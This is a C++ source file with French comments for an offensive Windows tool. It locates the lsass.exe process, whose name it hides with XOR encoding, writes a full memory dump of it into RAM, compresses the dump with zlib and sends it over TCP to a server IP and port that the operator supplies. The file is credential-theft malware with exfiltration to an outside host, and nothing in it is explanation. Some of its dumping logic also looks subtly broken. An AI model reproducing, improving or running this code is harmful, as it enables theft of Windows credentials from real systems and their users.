#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <zlib.h> // Compression avec zlib
#include <winsock2.h> // Communication réseau
#pragma comment(lib, "ws2_32.lib") // Bibliothèque réseau
#pragma comment(lib, "DbgHelp.lib") // MiniDumpWriteDump

using namespace std;

// Obfuscation d'une chaîne sensible
const wchar_t* DecodeString(const wchar_t* encoded, int key) {
    static wchar_t decoded[256];
    int i = 0;
    while (encoded[i] != '\0') {
        decoded[i] = encoded[i] ^ key;
        i++;
    }
    decoded[i] = '\0';
    return decoded;
}

// Récupère le PID d'un processus cible par son nom
DWORD GetTargetProcessPID(const wchar_t* targetProcessName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    DWORD targetPID = 0;
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, targetProcessName) == 0) {
                targetPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return targetPID;
}

// Dump mémoire du processus dans un buffer en RAM
bool DumpProcessToMemory(DWORD pid, vector<char>& dumpBuffer) {
    HMODULE hDbgHelp = LoadLibrary(L"DbgHelp.dll");
    if (!hDbgHelp) return false;

    typedef BOOL(WINAPI* MiniDumpWriteDumpType)(
        HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);

    auto MiniDumpWriteDumpFunc = (MiniDumpWriteDumpType)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!MiniDumpWriteDumpFunc) {
        FreeLibrary(hDbgHelp);
        return false;
    }

    HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!process) return false;

    // Crée un fichier en mémoire
    HANDLE memoryFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, 0x1000000, NULL); // 16MB buffer
    if (!memoryFile) {
        CloseHandle(process);
        return false;
    }

    void* buffer = MapViewOfFile(memoryFile, FILE_MAP_WRITE, 0, 0, 0x1000000);
    if (!buffer) {
        CloseHandle(memoryFile);
        CloseHandle(process);
        return false;
    }

    BOOL success = MiniDumpWriteDumpFunc(process, pid, memoryFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if (success) {
        dumpBuffer.assign((char*)buffer, (char*)buffer + 0x1000000);
    }

    UnmapViewOfFile(buffer);
    CloseHandle(memoryFile);
    CloseHandle(process);
    FreeLibrary(hDbgHelp);

    return success;
}

// Compression du buffer avec zlib
bool CompressBuffer(const vector<char>& inputBuffer, vector<char>& compressedBuffer) {
    uLongf compressedSize = compressBound(inputBuffer.size());
    compressedBuffer.resize(compressedSize);

    int result = compress((Bytef*)compressedBuffer.data(), &compressedSize, (const Bytef*)inputBuffer.data(), inputBuffer.size());
    if (result != Z_OK) {
        return false;
    }

    compressedBuffer.resize(compressedSize); // Ajuste la taille finale
    return true;
}

// Envoi du buffer compressé à un serveur
bool SendBufferToServer(const vector<char>& buffer, const string& serverIP, int port) {
    WSADATA wsaData;
    SOCKET clientSocket;
    sockaddr_in serverAddr;

    // Initialisation Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "[!] Winsock initialization failed." << endl;
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "[!] Socket creation failed." << endl;
        WSACleanup();
        return false;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());

    // Connexion au serveur
    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "[!] Connection to server failed." << endl;
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    // Envoi des données
    int bytesSent = send(clientSocket, buffer.data(), buffer.size(), 0);
    if (bytesSent == SOCKET_ERROR) {
        cerr << "[!] Failed to send data to server." << endl;
        closesocket(clientSocket);
        WSACleanup();
        return false;
    }

    cout << "[+] Sent " << bytesSent << " bytes to server." << endl;

    closesocket(clientSocket);
    WSACleanup();
    return true;
}

int main() {
    // Obfuscation de "lsass.exe"
    wchar_t encodedTarget[] = { 'l' ^ 0x13, 's' ^ 0x13, 'a' ^ 0x13, 's' ^ 0x13, 's' ^ 0x13, '.' ^ 0x13, 'e' ^ 0x13, 'x' ^ 0x13, 'e' ^ 0x13, '\0' };
    const wchar_t* targetProcessName = DecodeString(encodedTarget, 0x13);

    cout << "[*] Enter server IP: ";
    string serverIP;
    cin >> serverIP;

    cout << "[*] Enter server port: ";
    int port;
    cin >> port;

    DWORD pid = GetTargetProcessPID(targetProcessName);
    if (pid == 0) {
        cerr << "[!] Process not found." << endl;
        return EXIT_FAILURE;
    }

    vector<char> dumpBuffer;
    if (!DumpProcessToMemory(pid, dumpBuffer)) {
        cerr << "[!] Failed to dump process memory." << endl;
        return EXIT_FAILURE;
    }
    cout << "[+] Memory dump completed. Size: " << dumpBuffer.size() << " bytes." << endl;

    vector<char> compressedBuffer;
    if (!CompressBuffer(dumpBuffer, compressedBuffer)) {
        cerr << "[!] Failed to compress dump." << endl;
        return EXIT_FAILURE;
    }
    cout << "[+] Compression completed. Compressed size: " << compressedBuffer.size() << " bytes." << endl;

    if (!SendBufferToServer(compressedBuffer, serverIP, port)) {
        cerr << "[!] Failed to send compressed dump to server." << endl;
        return EXIT_FAILURE;
    }

    cout << "[+] Done!" << endl;
    return 0;
}
